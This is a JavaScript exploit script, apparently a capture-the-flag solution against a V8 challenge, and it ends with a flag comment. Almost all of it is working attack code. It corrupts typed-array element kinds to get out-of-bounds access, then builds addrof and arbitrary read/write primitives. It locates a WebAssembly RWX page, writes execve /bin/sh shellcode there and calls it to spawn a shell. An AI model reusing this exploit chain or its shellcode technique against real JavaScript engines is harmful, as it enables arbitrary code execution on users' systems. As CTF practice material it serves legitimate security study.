let oob, oob_rw, base;

function setup() {
  oob = new Uint8Array([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]);
  oob_rw = new BigUint64Array([
    0x1111111122222222n,
    0x1111111122222222n,
    0x1111111122222222n,
  ]);

  // Change the map to Uint32Array allowing us to access 14 ints intead of bytes
  %TransitionElementsKind(oob, %GetDerivedMap(Uint32Array, Uint32Array));

  //set array length
  oob[10] = 0xffffffff;
  oob[12] = 0xffffffff;

  // external_pointer
  base = BigInt(oob[60]) << 32n;
}

function addrof(obj) {
  let a = new BigUint64Array(1);
  %TransitionElementsKind(a, %GetDerivedMap(Array, []));
  a[0] = obj;
  %TransitionElementsKind(a, %GetDerivedMap(BigUint64Array, BigUint64Array));
  return base + a[0];
}

function read(addr) {
  oob[59] = 0;
  oob[60] = parseInt(addr >> 32n);

  oob[61] = parseInt(addr & 0xffffffffn);
  oob[62] = 0;

  return oob_rw[0];
}

function write(addr, val) {
  // external_pointer
  oob[59] = 0;
  oob[60] = parseInt(addr >> 32n);

  // base_pointer
  oob[61] = parseInt(addr & 0xffffffffn);
  oob[62] = 0;

  oob_rw[0] = val;
}

function write_bytes(addr, bytes) {
  while (bytes.length % 8) bytes.push(0);
  let a = new BigUint64Array(new Uint8Array(bytes).buffer);
  a.forEach((v, i) => {
    write(addr + 8n * BigInt(i), v);
  });
}

setup();

// prettier-ignore
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,16,11,11,146,128,128,128,0,1,0,65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports.hello;

wasm_mod_addr = addrof(wasm_mod);
rwx = read(wasm_mod_addr - 1n + 8n * 13n);

// prettier-ignore
// pwn shellcraft amd64.linux.sh
let shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72, 0x69, 0x1, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x31, 0xf6, 0x56, 0x6a, 0x8, 0x5e, 0x48, 0x1, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0xf, 0x5];
write_bytes(rwx, shellcode);
f();

/**
 * cat flag
 * SaF{https://www.youtube.com/watch?v=bUx9yPS4ExY}
 */
